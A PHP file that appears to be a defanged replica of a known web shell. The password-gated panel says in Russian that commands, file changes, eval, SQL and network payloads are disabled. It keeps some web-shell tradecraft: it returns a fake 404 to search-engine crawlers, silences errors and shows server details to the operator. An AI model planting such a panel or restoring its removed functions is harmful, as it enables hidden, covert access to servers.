<?php
declare(strict_types=1);

$storedHash = '21c6f979723693499b6b505fbccae9dc';
$defaultCharset = 'UTF-8';
$defaultAction = 'FilesMan';

if (empty($_POST['charset'])) {
    $_POST['charset'] = $defaultCharset;
}

@ini_set('display_errors', '0');
@error_reporting(0);

function stubSetCookie(string $name, string $value): void
{
    $_COOKIE[$name] = $value;
    setcookie($name, $value, [
        'expires' => time() + 86400,
        'path' => '/',
        'httponly' => true,
        'samesite' => 'Strict',
    ]);
}

function stubLoggedIn(): bool
{
    return isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])
        && $_COOKIE[md5($_SERVER['HTTP_HOST'])] === $GLOBALS['storedHash'];
}

function stubLoginForm(): void
{
    if (!empty($_SERVER['HTTP_USER_AGENT'])) {
        $bots = ['Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler'];
        if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
            header('HTTP/1.0 404 Not Found');
            exit;
        }
    }
    echo "<pre align=center><form method=post>Password<br>"
        . "<input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required>"
        . "<input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'>"
        . "</form></pre>";
    exit;
}

if (!empty($storedHash)) {
    if (isset($_POST['pass']) && md5((string) $_POST['pass']) === $storedHash) {
        stubSetCookie(md5($_SERVER['HTTP_HOST']), $storedHash);
    }
    if (!stubLoggedIn()) {
        stubLoginForm();
    }
}

$os = (strtolower(substr(PHP_OS, 0, 3)) === 'win') ? 'win' : 'nix';
$cwd = __DIR__ . '/';
$safeMode = @ini_get('safe_mode');

function stubViewSize(int $bytes): string
{
    if ($bytes >= 1073741824) {
        return sprintf('%1.2f GB', $bytes / 1073741824);
    }
    if ($bytes >= 1048576) {
        return sprintf('%1.2f MB', $bytes / 1048576);
    }
    if ($bytes >= 1024) {
        return sprintf('%1.2f KB', $bytes / 1024);
    }
    return $bytes . ' B';
}

function stubHeader(): void
{
    $charset = htmlspecialchars((string) ($_POST['charset'] ?? $GLOBALS['defaultCharset']), ENT_QUOTES, 'UTF-8');
    $cwd = htmlspecialchars($GLOBALS['cwd'], ENT_QUOTES, 'UTF-8');
    echo "<!DOCTYPE html><html><head><meta http-equiv='Content-Type' content='text/html; charset={$charset}'>"
        . "<title>" . htmlspecialchars($_SERVER['HTTP_HOST'], ENT_QUOTES, 'UTF-8') . " — stub</title>"
        . "<style>
	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif;}
	body,td,th {font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
	table.info {color:#C3C3C3;}
	table#toolsTbl {background-color:#060A10;}
	span,h1,a {color:#fff !important;}
	span {font-weight:bolder;}
	h1 {border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0;}
	div.content {padding:5px;margin-left:5px;background-color:#060a10;}
	a {text-decoration:none;}
	a:hover {text-decoration:underline;}
	.ml1 {border:1px solid #202832;padding:5px;margin:0;overflow:auto;background:#0a0f16;}
	.stub-note {color:#FFDB5F;}
</style></head><body><div style='position:absolute;background-color:rgba(95,110,130,0.3);width:100%;top:0;left:0;'>";

    $uid = function_exists('posix_geteuid') ? @posix_geteuid() : @getmyuid();
    $user = function_exists('get_current_user') ? @get_current_user() : '?';
    $php = phpversion();
    $free = @disk_free_space($GLOBALS['cwd']);
    $total = @disk_total_space($GLOBALS['cwd']) ?: 1;

    $menu = [
        'Sec. Info' => 'SecInfo',
        'Files' => 'FilesMan',
        'Console' => 'Console',
        'Sql' => 'Sql',
        'Php' => 'Php',
        'String tools' => 'StringTools',
        'Network' => 'Network',
        'Logout' => 'Logout',
    ];
    $menuHtml = '';
    foreach ($menu as $label => $action) {
        $menuHtml .= '<th>[ <a href="?a=' . urlencode($action) . '">' . htmlspecialchars($label, ENT_QUOTES, 'UTF-8') . '</a> ]</th>';
    }

    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr>'
        . '<td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td>'
        . '<td><nobr>' . htmlspecialchars(php_uname(), ENT_QUOTES, 'UTF-8') . '</nobr><br>'
        . htmlspecialchars((string) $uid, ENT_QUOTES, 'UTF-8') . ' ( ' . htmlspecialchars((string) $user, ENT_QUOTES, 'UTF-8') . ' )<br>'
        . htmlspecialchars((string) $php, ENT_QUOTES, 'UTF-8')
        . ' <span>Safe mode:</span> ' . ($GLOBALS['safeMode'] ? 'ON' : 'OFF') . '<br>'
        . stubViewSize((int) $total) . ' <span>Free:</span> ' . stubViewSize((int) $free) . '<br>'
        . $cwd . '</td>'
        . '<td width=1 align=right><span>Client IP:</span><br>' . htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '', ENT_QUOTES, 'UTF-8') . '</td>'
        . '</tr></table>'
        . '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menuHtml . '</tr></table>'
        . '<div class=content><p class=stub-note>Режим заглушки: опасные действия отключены. Оболочка не выполняет команды и не изменяет файлы.</p>';
}

function stubFooter(): void
{
    echo '</div></div></body></html>';
}

function stubDisabled(string $title, string $hint): void
{
    stubHeader();
    echo '<h1>' . htmlspecialchars($title, ENT_QUOTES, 'UTF-8') . '</h1>';
    echo '<pre class=ml1>' . htmlspecialchars($hint, ENT_QUOTES, 'UTF-8') . '</pre>';
    stubFooter();
}

function actionSecInfo(): void
{
    stubHeader();
    echo '<h1>Server security information</h1>';
    echo '<pre class=ml1">';
    echo "Server software: " . (getenv('SERVER_SOFTWARE') ?: 'n/a') . "\n";
    echo "PHP: " . phpversion() . "\n";
    echo "Disabled functions: " . (@ini_get('disable_functions') ?: 'none') . "\n";
    echo "open_basedir: " . (@ini_get('open_basedir') ?: 'none') . "\n";
    echo '</pre>';
    stubFooter();
}

function actionFilesMan(): void
{
    stubDisabled('File manager', "Просмотр и изменение файлов отключены.\nЗагрузка, удаление, chmod и архивы недоступны.");
}

function actionConsole(): void
{
    stubDisabled('Console', "Выполнение shell-команд отключено.");
}

function actionPhp(): void
{
    stubDisabled('Execution PHP-code', "eval и произвольный PHP отключены.");
}

function actionSql(): void
{
    stubDisabled('Sql browser', "Подключение к БД и дампы отключены.");
}

function actionStringTools(): void
{
    stubDisabled('String conversions', "Инструменты строк доступны только как заглушка.");
}

function actionNetwork(): void
{
    stubDisabled('Network tools', "bind/back-connect и сетевые полезные нагрузки отключены.");
}

function actionLogout(): void
{
    stubSetCookie(md5($_SERVER['HTTP_HOST']), '');
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
    header('Location: ' . ($_SERVER['PHP_SELF'] ?? '/'));
    exit;
}

$action = $_GET['a'] ?? $_POST['a'] ?? $defaultAction;
$handlers = [
    'SecInfo' => 'actionSecInfo',
    'FilesMan' => 'actionFilesMan',
    'Console' => 'actionConsole',
    'Php' => 'actionPhp',
    'Sql' => 'actionSql',
    'StringTools' => 'actionStringTools',
    'Network' => 'actionNetwork',
    'Logout' => 'actionLogout',
];

if (isset($handlers[$action]) && is_callable($handlers[$action])) {
    call_user_func($handlers[$action]);
} else {
    actionFilesMan();
}
